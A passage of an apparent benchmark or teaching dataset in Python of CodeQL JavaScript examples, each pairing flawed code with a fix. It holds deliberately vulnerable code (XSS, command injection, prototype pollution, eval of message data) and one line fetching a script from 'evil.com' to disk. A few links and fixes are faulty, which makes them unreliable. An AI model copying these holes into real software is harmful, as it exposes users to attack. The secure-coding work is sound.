    '\u2028': '\\u2028',
    '\u2029': '\\u2029'
};

function escapeUnsafeChars(str) {
    return str.replace(/[<>\b\f\n\r\t\0\u2028\u2029]/g, x => charMap[x])
}

function createObjectWrite() {
    const assignment = `obj[${escapeUnsafeChars(JSON.stringify(key))}]=42`;
    return `(function(){${assignment}})` // OK
}"""
    },
    {
        "id": 66,
        "name": "Inclusion of functionality from an untrusted source",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-functionality-from-untrusted-source/",
        "code": """<html>
    <head>
        <title>jQuery demo</title>
        <script src="http://code.jquery.com/jquery-3.6.0.slim.min.js" crossorigin="anonymous"></script>
    </head>
    <body>
        ...
    </body>
</html>""",
        "fix": """<html>
    <head>
        <title>jQuery demo</title>
        <script src="https://code.jquery.com/jquery-3.6.0.slim.min.js" integrity="sha256-u7e5khyithlIdTpu22PHhENmPcRdFiHRjhAuHcs05RI=" crossorigin="anonymous"></script>
    </head>
    <body>
        ...
    </body>
</html>"""
    },
    {
        "id": 67,
        "name": "Incompatible dependency injection",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-angular-incompatible-service/",
        "code": """angular.module('myModule', [])
    .config(['year', function(year) {
        // ...
    }]);

angular.module('myModule')
    .value('year', 2000);""",
        "fix": """angular.module('myModule', [])
    .config(['year', function(year) {
        // ...
    }]);

angular.module('myModule')
    .constant('year', 2000); // GOOD: year is of kind 'constant'"""
    },
    {
        "id": 68,
        "name": "Incomplete HTML attribute sanitization",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-incomplete-html-attribute-sanitization/",
        "code": """var app = require('express')();

app.get('/user/:id', function(req, res) {
	let id = req.params.id;
	id = id.replace(/<|>/g, "");
	let userHtml = `<div data-id="${id}">${getUserName(id) || "Unknown name"}</div>`;
	// ...
	res.send(prefix + userHtml + suffix);
});""",
        "fix": """var app = require('express')();

app.get('/user/:id', function(req, res) {
	let id = req.params.id;
	id = id.replace(/<|>|&|"/g, ""); // GOOD
	let userHtml = `<div data-id="${id}">${getUserName(id) || "Unknown name"}</div>`;
	// ...
	res.send(prefix + userHtml + suffix);
});"""
    },
    {
        "id": 69,
        "name": "Incomplete URL scheme check",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-incomplete-url-scheme-check/",
        "code": """function sanitizeUrl(url) {
    let u = decodeURI(url).trim().toLowerCase();
    if (u.startsWith("javascript:"))
        return "about:blank";
    return url;
}""",
        "fix": """function sanitizeUrl(url) {
    let u = decodeURI(url).trim().toLowerCase();
    if (u.startsWith("javascript:") || u.startsWith("data:") || u.startsWith("vbscript:"))
        return "about:blank";
    return url;
}"""
    },
    {
        "id": 70,
        "name": "Incomplete URL substring sanitization",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-incomplete-url-substring-sanitization/",
        "code": """app.get('/some/path', function(req, res) {
    let url = req.param("url");
    if (url.includes("example.com")) {
        res.redirect(url);
    }
});""",
        "fix": """app.get('/some/path', function(req, res) {
    let url = req.param('url'),
        host = urlLib.parse(url).host;
    // GOOD: the host of `url` can not be controlled by an attacker
    let allowedHosts = [
        'example.com',
        'beta.example.com',
        'www.example.com'
    ];
    if (allowedHosts.includes(host)) {
        res.redirect(url);
    }
});"""
    },
    {
        "id": 71,
        "name": "Incomplete multi-character sanitization",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-incomplete-multi-character-sanitization/",
        "code": """str.replace(/<!--|--!?>/g, "");   """,
        "fix": """function removeHtmlComments(input) {  
  let previous;  
  do {  
    previous = input;  
    input = input.replace(/<!--|--!?>/g, "");  
  } while (input !== previous);  
  return input;  
}  """
    },
    {
        "id": 72,
        "name": "Incomplete regular expression for hostnames",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-incomplete-hostname-regexp/",
        "code": """app.get('/some/path', function(req, res) {
    let url = req.param('url'),
        host = urlLib.parse(url).host;
    let regex = /^((www|beta).)?example.com/;
    if (host.match(regex)) {
        res.redirect(url);
    }
});"""
    },
    {
        "id": 73,
        "name": "Incomplete string escaping or encoding",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-incomplete-sanitization/",
        "code": """function escapeQuotes(s) {
  return s.replace("'", "''");
}""",
        "fix": """function escapeQuotes(s) {
  return s.replace(/'/g, "''");
}"""
    },
    {
        "id": 74,
        "name": "Inconsistent direction of for loop",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-inconsistent-loop-direction/",
        "code": """// zero out everything below index `lower`
for (i=lower-1; i>=0; --i)
    a[i] = 0;

// zero out everything above index `upper`
for (i=upper+1; i<a.length; --i)
    a[i] = 0;""",
        "fix": """// zero out everything below index `lower`
for (i=lower-1; i>=0; --i)
    a[i] = 0;

// zero out everything above index `upper`
for (i=upper+1; i<a.length; ++i)
    a[i] = 0;"""
    },
    {
        "id": 75,
        "name": "Inconsistent use of ‘new’",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-inconsistent-use-of-new/",
        "code": """function Point(x, y) {
  this.x = x;
  this.y = y;
}

var p = new Point(23, 42),
    q = Point(56, 72);""",
        "fix": """function Point(x, y) {
  this.x = x;
  this.y = y;
}

var p = new Point(23, 42),
    q = new Point(56, 72);"""
    },
    {
        "id": 76,
        "name": "Incorrect suffix check",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-incorrect-suffix-check/",
        "code": """function endsWith(x, y) {
  return x.lastIndexOf(y) === x.length - y.length;
}""",
        "fix": """function endsWith(x, y) {
  let index = x.lastIndexOf(y);
  return index !== -1 && index === x.length - y.length;
}"""
    },
    {
        "id": 77,
        "name": "Indirect uncontrolled command line",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-indirect-command-line-injection/",
        "code": """var cp = require("child_process");

const args = process.argv.slice(2);
const script = path.join(__dirname, 'bin', 'main.js');
cp.execSync(`node ${script} ${args.join(' ')}`);""",
        "fix": """var cp = require("child_process");

const args = process.argv.slice(2);
const script = path.join(__dirname, 'bin', 'main.js');
cp.execFileSync('node', [script].concat(args)); // GOOD"""
    },
    {
        "id": 78,
        "name": "Ineffective parameter type",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-ineffective-parameter-type/",
        "code": """function join<T>(items: T[], callback: (T) => string) {
  return items.map(callback).join(", ")
}""",
        "fix": """function join<T>(items: T[], callback: (item: T) => string) {
  return items.map(callback).join(", ")
}"""
    },
    {
        "id": 80,
        "name": "Information exposure through a stack trace",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-stack-trace-exposure/",
        "code": """var http = require('http');

http.createServer(function onRequest(req, res) {
  var body;
  try {
    body = handleRequest(req);
  }
  catch (err) {
    res.statusCode = 500;
    res.setHeader("Content-Type", "text/plain");
    res.end(err.stack);
    return;
  }
  res.statusCode = 200;
  res.setHeader("Content-Type", "application/json");
  res.setHeader("Content-Length", body.length);
  res.end(body);
}).listen(3000);""",
        "fix": """var http = require('http');

http.createServer(function onRequest(req, res) {
  var body;
  try {
    body = handleRequest(req);
  }
  catch (err) {
    res.statusCode = 500;
    res.setHeader("Content-Type", "text/plain");
    log("Exception occurred", err.stack);
    res.end("An exception occurred"); // OK
    return;
  }
  res.statusCode = 200;
  res.setHeader("Content-Type", "application/json");
  res.setHeader("Content-Length", body.length);
  res.end(body);
}).listen(3000);"""
    },
    {
        "id": 81,
        "name": "Insecure URL whitelist",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-angular-insecure-url-whitelist/",
        "code": """angular.module('myApp', [])
    .config(function($sceDelegateProvider) {
        $sceDelegateProvider.resourceUrlWhitelist([
            "*://example.org/*",
            "https://**.example.com/*",
            "https://example.**",
            "https://example.*"
        ]);
    });"""
    },
    {
        "id": 82,
        "name": "Insecure randomness",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-insecure-randomness/",
        "code": """function insecurePassword() {
    var suffix = Math.random();
    var password = "myPassword" + suffix;
    return password;
}""",
        "fix": """function securePassword() {
    // GOOD: the random suffix is cryptographically secure
    var suffix = window.crypto.getRandomValues(new Uint32Array(1))[0];
    var password = "myPassword" + suffix;
    return password;
}"""
    },
    {
        "id": 83,
        "name": "Insecure temporary file",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-insecure-temporary-file/",
        "code": """const fs = require('fs');
const os = require('os');
const path = require('path');

const file = path.join(os.tmpdir(), "test-" + (new Date()).getTime() + ".txt");
fs.writeFileSync(file, "content");""",
        "fix": """const fs = require('fs');
const tmp = require('tmp');

const file = tmp.fileSync().name;
fs.writeFileSync(file, "content");"""
    },
    {
        "id": 84,
        "name": "Invalid prototype value",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-invalid-prototype-value/",
        "code": """let dict = Object.create(undefined);""",
        "fix": """let dict = Object.create(null);"""
    },
    {
        "id": 85,
        "name": "Invocation of non-function",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-call-to-non-callable/",
        "code": """function error(msg) {
  console.log(msg);
}

function processResponse(response) {
  if (response.status === 200) {
    var error = processResponseText(response.responseText);
    if (error)
       throw error;
  } else {
    error("Unexpected response status " + response.status);
  }
}""",
        "fix": """function error(msg) {
  console.log(msg);
}

function processResponse(response) {
  if (response.status === 200) {
    let error = processResponseText(response.responseText);
    if (error)
       throw error;
  } else {
    error("Unexpected response status " + response.status);
  }
}"""
    },
    {
        "id": 86,
        "name": "JWT missing secret or public key verification",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-jwt-missing-verification/",
        "code": """const jwt = require("jsonwebtoken");

const secret = "my-secret-key";

var token = jwt.sign({ foo: 'bar' }, secret, { algorithm: "none" })
jwt.verify(token, false, { algorithms: ["HS256", "none"] })""",
        "fix": """const jwt = require("jsonwebtoken");

const secret = "my-secret-key";

var token = jwt.sign({ foo: 'bar' }, secret, { algorithm: "HS256" }) 
jwt.verify(token, secret, { algorithms: ["HS256", "none"] })"""
    },
    {
        "id": 87,
        "name": "Log injection",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-log-injection/",
        "code": """const http = require('http');
const url = require('url');

const server = http.createServer((req, res) => {
    let q = url.parse(req.url, true);

    console.info(`[INFO] User: ${q.query.username}`);
})

server.listen(3000, '127.0.0.1', () => {});""",
        "fix": """const http = require('http');
const url = require('url');

const server = http.createServer((req, res) => {
    let q = url.parse(req.url, true);

    // GOOD: remove newlines from user controlled input before logging
    let username = q.query.username.replace(/\n|\r/g, "");

    console.info(`[INFO] User: ${username}`);
});

server.listen(3000, '127.0.0.1', () => {});"""
    },
    {
        "id": 88,
        "name": "Loop bound injection",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-loop-bound-injection/",
        "code": """var express = require('express');
var app = express();

app.post("/foo", (req, res) => {
    var obj = req.body;

    var ret = [];

    for (var i = 0; i < obj.length; i++) {
        ret.push(obj[i]);
    }
});""",
        "fix": """var express = require('express');
var app = express();

app.post("/foo", (req, res) => {
    var obj = req.body;

    if (!(obj instanceof Array)) { // Prevents DoS.
        return [];
    }

    var ret = [];

    for (var i = 0; i < obj.length; i++) {
        ret.push(obj[i]);
    }
});"""
    },
    {
        "id": 89,
        "name": "Loop iteration skipped due to shifting",
        "correct": False,
        "issues": [],
        "link": "https://codeql.gpathithub.com/codeql-query-help/javascript/js-loop-iteration-skipped-due-to-shifting/",
        "code": """function removePathTraversal(path) {
  let parts = path.split('/');
  for (let i = 0; i < parts.length; ++i) {
    if (parts[i] === '..') {
      parts.splice(i, 1);
    }
  }
  return path.join('/');
}""",
        "fix": """function removePathTraversal(path) {
  let parts = path.split('/');
  for (let i = 0; i < parts.length; ++i) {
    if (parts[i] === '..') {
      parts.splice(i, 1);
      --i; // adjust for array shift
    }
  }
  return path.join('/');
}"""
    },
    {
        "id": 90,
        "name": "Malformed id attribute",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-malformed-html-id/",
        "code": """<div id="heading important">An important heading</div>""",
        "fix": """<div class="heading important">An important heading</div>"""
    },
    {
        "id": 91,
        "name": "Misleading indentation after control statement",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-misleading-indentation-after-control-statement/",
        "code": """if (afraid())
	scream();
	runAway();""",
        "fix": """if (afraid()) {
	scream();
	runAway();
}"""
    },
    {
        "id": 93,
        "name": "Misleading indentation of dangling ‘else’",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-missing-dot-length-in-comparison/",
        "code": """function f() {
	if (cond1())
		if (cond2())
			return 23;
	else
		return 42;
	return 56;
}""",
        "fix": """function f() {
	if (cond1())
		if (cond2())
			return 23;
		else
			return 42;
	return 56;
}"""
    },
    {
        "id": 94,
        "name": "Missing ‘this’ qualifier",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-missing-this-qualifier/",
        "code": """class Audio3D {
  setAudioStream(){
    // ...
    setAudioProperties();
    // ...
  }

  setAudioProperties(){
    // ...  
  }
}"""
    },
    {
        "id": 95,
        "name": "Missing CSRF middleware",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-missing-token-validation/",
        "code": """const app = require("express")(),
  cookieParser = require("cookie-parser"),
  bodyParser = require("body-parser"),
  session = require("express-session");

app.use(cookieParser());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(session({ secret: process.env['SECRET'], cookie: { maxAge: 60000 } }));

// ...

app.post("/changeEmail", function(req, res) {
  const userId = req.session.id;
  const email = req.body["email"];
  // ... update email associated with userId
});""",
        "fix": """const app = require("express")(),
  cookieParser = require("cookie-parser"),
  bodyParser = require("body-parser"),
  session = require("express-session"),
  csrf = require('lusca').csrf;

app.use(cookieParser());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(session({ secret: process.env['SECRET'], cookie: { maxAge: 60000 } }));
app.use(csrf());

// ...

app.post("/changeEmail", function(req, res) {
  const userId = req.session.id;
  const email = req.body["email"];
  // ... update email associated with userId
});"""
    },
    {
        "id": 96,
        "name": "Missing await",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-missing-await/",
        "code": """async function getData(id) {
  let req = await fetch(`https://example.com/data?id=${id}`);
  if (!req.ok) return null;
  return req.json();
}

async function showData(id) {
  let data = getData(id);
  if (data == null) {
    console.warn("No data for: " + id);
    return;
  }
  // ...
}""",
        "fix": """async function getData(id) {
  let req = await fetch(`https://example.com/data?id=${id}`);
  if (!req.ok) return null;
  return req.json();
}

async function showData(id) {
  let data = await getData(id);
  if (data == null) {
    console.warn("No data for: " + id);
    return;
  }
  // ...
}"""
    },
    {
        "id": 97,
        "name": "Missing explicit dependency injection",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-angular-missing-explicit-injection/",
        "code": """angular.module('myModule', [])
    .controller('MyController', function($scope) {
        // ...
});""",
        "fix": """angular.module('myModule', [])
    .controller('MyController', ['$scope', function($scope) { // GOOD: explicit dependency name
        // ...
}]);"""
    },
    {
        "id": 98,
        "name": "Missing exports qualifier",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-node-missing-exports-qualifier/",
        "code": """exports.checkOne = function(x) {
  if (!x) throw new Error();
};

var checkList = exports.checkList = function(xs) {
  for (var i=0; i<xs.length; ++i)
    checkOne(xs[i]);
};""",
        "fix": """exports.checkOne = function(x) {
  if (!x) throw new Error();
};

var checkList = exports.checkList = function(xs) {
  for (var i=0; i<xs.length; ++i)
    exports.checkOne(xs[i]);
};"""
    },
    {
        "id": 99,
        "name": "Missing origin verification in postMessage handler",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-missing-origin-check/",
        "code": """function postMessageHandler(event) {
    let origin = event.origin.toLowerCase();

    console.log(origin)
    eval(event.data);
}

window.addEventListener('message', postMessageHandler, false);""",
        "fix": """function postMessageHandler(event) {
    console.log(event.origin)
    // GOOD: the origin property is checked
    if (event.origin === 'https://www.example.com') {
        // do something
    }
}

window.addEventListener('message', postMessageHandler, false);"""
    },
    {
        "id": 100,
        "name": "Missing rate limiting",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-missing-rate-limiting/",
        "code": """var express = require('express');
var app = express();

app.get('/:path', function(req, res) {
  let path = req.params.path;
  if (isValidPath(path))
    res.sendFile(path);
});""",
        "fix": """var express = require('express');
var app = express();

// set up rate limiter: maximum of five requests per minute
var RateLimit = require('express-rate-limit');
var limiter = RateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // max 100 requests per windowMs
});

// apply rate limiter to all requests
app.use(limiter);

app.get('/:path', function(req, res) {
  let path = req.params.path;
  if (isValidPath(path))
    res.sendFile(path);
});"""
    },
    {
        "id": 101,
        "name": "Missing regular expression anchor",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-regex-missing-regexp-anchor/",
        "code": """app.get("/some/path", function(req, res) {
    let url = req.param("url");
    if (url.match(/https?:\/\/www\.example\.com\//)) {
        res.redirect(url);
    }
});""",
        "fix": """app.get("/some/path", function(req, res) {
    let url = req.param("url");
    // GOOD: the host of `url` can not be controlled by an attacker
    if (url.match(/^https?:\/\/www\.example\.com\//)) {
        res.redirect(url);
    }
});"""
    },
    {
        "id": 102,
        "name": "Missing space in string concatenation",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-missing-space-in-concatenation/",
        "code": """var s = "This text is" +
  "missing a space.";"""
    },
    {
        "id": 103,
        "name": "Missing variable declaration",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-missing-variable-declaration/",
        "code": """function f(a) {
	var sum = 0;
	for (i=0; i<a.length; ++i)
		sum += g(a[i]);
	return sum;
}

function g(b) {
	var prod = 1;
	for (i=0; i<b.length; ++i)
		prod *= b[i];
	return prod;
}"""
    },
    {
        "id": 104,
        "name": "Misspelled variable name",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-misspelled-variable-name/",
        "code": """function selectElements(ids) {
    for (var i=0, length=ids.length; i<lenght; ++i) {
        var id = ids[i];
        if (id) {
            var element = document.getElementById(id);
            element.className += " selected";
        }
    }
}"""
    },
    {
        "id": 105,
        "name": "Network data written to file",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-http-to-file-access/",
        "code": """var https = require("https");
var fs = require("fs");

https.get('https://evil.com/script', res => {
  res.on("data", d => {
    fs.writeFileSync("/tmp/script", d)
  })
});"""
    },
    {
        "id": 106,
        "name": "Non-case label in switch statement",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-label-in-switch/",
        "code": """function f(x) {
	switch (x) {
	case 1:
	case 2:
	case3:
		return true;
	default:
		return false;
	}
}"""
    },
    {
        "id": 107,
        "name": "Non-linear pattern",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-non-linear-pattern/",
        "code": """function distanceFromOrigin(point) {
    var [x, x] = point;
    return Math.sqrt(x*x + y*y);
}""",
        "fix": """function distanceFromOrigin(point) {
    var [x, y] = point;
    return Math.sqrt(x*x + y*y);
}"""
    },
    {
        "id": 108,
        "name": "Off-by-one comparison against length",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-index-out-of-bounds/",
        "code": """function contains(a, elt) {
  for (let i = 0; i <= a.length; ++i)
    if (a[i] === elt)
      return true;
  return false;
}""",
        "fix": """function contains(a, elt) {
  for (let i = 0; i < a.length; ++i)
    if (a[i] === elt)
      return true;
  return false;
}"""
    },
    {
        "id": 109,
        "name": "Overly permissive regular expression range",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-overly-large-range/",
        "code": """function isValidHexColor(color) {
    return /^#[0-9a-fA-f]{6}$/i.test(color);
}""",
        "fix": """function isValidHexColor(color) {
    return /^#[0-9A-F]{6}$/i.test(color);
}"""
    },
    {
        "id": 110,
        "name": "Overwritten property",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-overwritten-property/",
        "code": """function dist(p) {
	return Math.sqrt(p.x*p.x+p.y*p.y);
}

var point = {
	x: 3,
	x: 4
};
console.log(dist(point));"""
    },
    {
        "id": 113,
        "name": "Potential file system race condition",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-file-system-race/",
        "code": """const fs = require("fs");
const os = require("os");
const path = require("path");

const filePath = path.join(os.tmpdir(), "my-temp-file.txt");

if (!fs.existsSync(filePath)) {
  fs.writeFileSync(filePath, "Hello", { mode: 0o600 });
}""",
        "fix": """const fs = require("fs");
const os = require("os");
const path = require("path");

const filePath = path.join(os.tmpdir(), "my-temp-file.txt");

try {
  const fd = fs.openSync(filePath, fs.O_CREAT | fs.O_EXCL | fs.O_RDWR, 0o600);

  fs.writeFileSync(fd, "Hello");
} catch (e) {
  // file existed
}"""
    },
    {
        "id": 114,
        "name": "Potentially inconsistent state update",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-react-inconsistent-state-update/",
        "code": """this.setState({
  counter: this.state.counter + 1
});""",
        "fix": """this.setState(prevState => ({
  counter: prevState.counter + 1
}));"""
    },
    {
        "id": 115,
        "name": "Property access on null or undefined",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-property-access-on-non-object/",
        "code": """function f() {
  var result;
  res = computeInterestingResult();
  return result.value;
}""",
        "fix": """function f() {
  var result;
  result = computeInterestingResult();
  return result.value;
}"""
    },
    {
        "id": 116,
        "name": "Prototype-polluting assignment",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-prototype-polluting-assignment/",
        "code": """let express = require('express');
let app = express()

app.put('/todos/:id', (req, res) => {
    let id = req.params.id;
    let items = req.session.todos[id];
    if (!items) {
        items = req.session.todos[id] = {};
    }
    items[req.query.name] = req.query.text;
    res.end(200);
});""",
        "fix": """let express = require('express');
let app = express()

app.put('/todos/:id', (req, res) => {
    let id = req.params.id;
    let items = req.session.todos.get(id);
    if (!items) {
        items = new Map();
        req.sessions.todos.set(id, items);
    }
    items.set(req.query.name, req.query.text);
    res.end(200);
});"""
    },
    {
        "id": 117,
        "name": "Prototype-polluting function",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-prototype-pollution-utility/",
        "code": """function merge(dst, src) {
    for (let key in src) {
        if (!src.hasOwnProperty(key)) continue;
        if (isObject(dst[key])) {
            merge(dst[key], src[key]);
        } else {
            dst[key] = src[key];
        }
    }
}""",
        "fix": """function merge(dst, src) {
    for (let key in src) {
        if (!src.hasOwnProperty(key)) continue;
        if (dst.hasOwnProperty(key) && isObject(dst[key])) {
            merge(dst[key], src[key]);
        } else {
            dst[key] = src[key];
        }
    }
}"""
    },
    {
        "id": 118,
        "name": "Prototype-polluting merge call",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-prototype-pollution/",
        "code": """app.get('/news', (req, res) => {
  let config = lodash.merge({}, {
    prefs: req.query.prefs
  });
})"""
    },
    {
        "id": 119,
        "name": "Reflected cross-site scripting",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-reflected-xss/",
        "code": """var app = require('express')();

app.get('/user/:id', function(req, res) {
  if (!isValidUserId(req.params.id))
    res.send("Unknown user: " + req.params.id);
  else
    // TODO: do something exciting
    ;
});""",
        "fix": """var escape = require('escape-html');

var app = require('express')();

app.get('/user/:id', function(req, res) {
  if (!isValidUserId(req.params.id))
    // GOOD: request parameter is sanitized before incorporating it into the response
    res.send("Unknown user: " + escape(req.params.id));
  else
    // TODO: do something exciting
    ;
});"""
    },
    {
        "id": 120,
        "name": "Regular expression always matches",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-regex-always-matches/",
        "code": """if (!/[a-z0-9]*/.test(id)) {
    throw new Error("Invalid id: " + id);
}""",
        "fix": """if (!/^[a-z0-9]*$/.test(id)) {
    throw new Error("Invalid id: " + id);
}"""
    },
    {
        "id": 121,
        "name": "Regular expression injection",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-regex-injection/",
        "code": """var express = require('express');
var app = express();

app.get('/findKey', function(req, res) {
  var key = req.param("key"), input = req.param("input");

  var re = new RegExp("\\b" + key + "=(.*)\n");
});""",
        "fix": """var express = require('express');
var _ = require('lodash');
var app = express();

app.get('/findKey', function(req, res) {
  var key = req.param("key"), input = req.param("input");

  // GOOD: User input is sanitized before constructing the regex
  var safeKey = _.escapeRegExp(key);
  var re = new RegExp("\\b" + safeKey + "=(.*)\n");
});"""
    },
    {
        "id": 122,
        "name": "Remote property injection",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-remote-property-injection/",
        "code": """var express = require('express');

var app = express();
var myObj = {}

app.get('/user/:id', function(req, res) {
	var prop = req.query.userControlled;
	myObj[prop] = function() {};
	console.log("Request object " + myObj);
});""",
        "fix": """var express = require('express');

var app = express();
var myObj = {}

app.get('/user/:id', function(req, res) {
	var prop = "$" + req.query.userControlled; // GOOD
	myObj[prop] = function() {};
	console.log("Request object " + myObj);
});"""
    },
    {
        "id": 123,
        "name": "Repeated dependency injection",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-angular-repeated-dependency-injection/",
        "code": """function myController($scope, $filter) {
    // ...
}
myController.$inject = ["$scope", "$cookies"];
// ...
myController.$inject = ["$scope", "$filter"];
angular.module('myModule', []).controller('MyController', myController);""",
        "fix": """function myController($scope, $filter) {
    // ...
}
myController.$inject = ["$scope", "$filter"]; // GOOD: specified once
angular.module('myModule', []).controller('MyController', myController);"""
    },
    {
        "id": 124,
        "name": "Replacement of a substring with itself",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-identity-replacement/",
        "code": """var escaped = raw.replace(/"/g, '\"');""",
        "fix": """var escaped = raw.replace(/"/g, '\\"');"""
    },
    {
        "id": 125,
        "name": "Resource exhaustion¶",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-resource-exhaustion/",
        "code": """var http = require("http"),
    url = require("url");

var server = http.createServer(function(req, res) {
	var size = parseInt(url.parse(req.url, true).query.size);

	let buffer = Buffer.alloc(size);

	// ... use the buffer
});""",
        "fix": """var http = require("http"),
    url = require("url");

var server = http.createServer(function(req, res) {
	var size = parseInt(url.parse(req.url, true).query.size);

	if (size > 1024) {
		res.statusCode = 400;
		res.end("Bad request.");
		return;
	}

	let buffer = Buffer.alloc(size); // GOOD

	// ... use the buffer
});"""
    },
    {
        "id": 126,
        "name": "Resources exhaustion from deep object traversal",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-resource-exhaustion-from-deep-object-traversal/",
        "code": """import express from 'express';
import Ajv from 'ajv';

let ajv = new Ajv({ allErrors: true });
ajv.addSchema(require('./input-schema'), 'input');

var app = express();
app.get('/user/:id', function(req, res) {
	if (!ajv.validate('input', req.body)) {
		res.end(ajv.errorsText());
		return;
	}
	// ...
});""",
        "fix": """import express from 'express';
import Ajv from 'ajv';

let ajv = new Ajv({ allErrors: process.env['REST_DEBUG'] });
ajv.addSchema(require('./input-schema'), 'input');

var app = express();
app.get('/user/:id', function(req, res) {
	if (!ajv.validate('input', req.body)) {
		res.end(ajv.errorsText());
		return;
	}
	// ...
});"""
    },
    {
        "id": 127,
        "name": "Return statement assigns local variable",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-useless-assignment-in-return/",
        "code": """function Person(first, last, age) {
	this.first = first;
	this.last = last;
	this.age = age;
}

Person.prototype.getName = function() {
	var name = first + " " + last;
	return name = name.trim();
};""",
        "fix": """function Person(first, last, age) {
	this.first = first;
	this.last = last;
	this.age = age;
}

Person.prototype.getName = function() {
	var name = first + " " + last;
	return name.trim();
};"""
    },
    {
        "id": 128,
        "name": "Second order command injection",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-second-order-command-line-injection/",
        "code": """const express = require("express");
const app = express();

const cp = require("child_process");

app.get("/ls-remote", (req, res) => {
  const remote = req.query.remote;
  cp.execFile("git", ["ls-remote", remote]);
});""",
        "fix": """const express = require("express");
const app = express();

const cp = require("child_process");

app.get("/ls-remote", (req, res) => {
  const remote = req.query.remote;
  if (!(remote.startsWith("git@") || remote.startsWith("https://"))) {
    throw new Error("Invalid remote: " + remote);
  }
  cp.execFile("git", ["ls-remote", remote]); // OK
});"""
    },
    {
        "id": 129,
        "name": "Self assignment",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-redundant-assignment/",
        "code": """function Rectangle(x, y, width, height) {
	this.x = x;
	this.y = y;
	width = width;
	this.height = height;
}""",
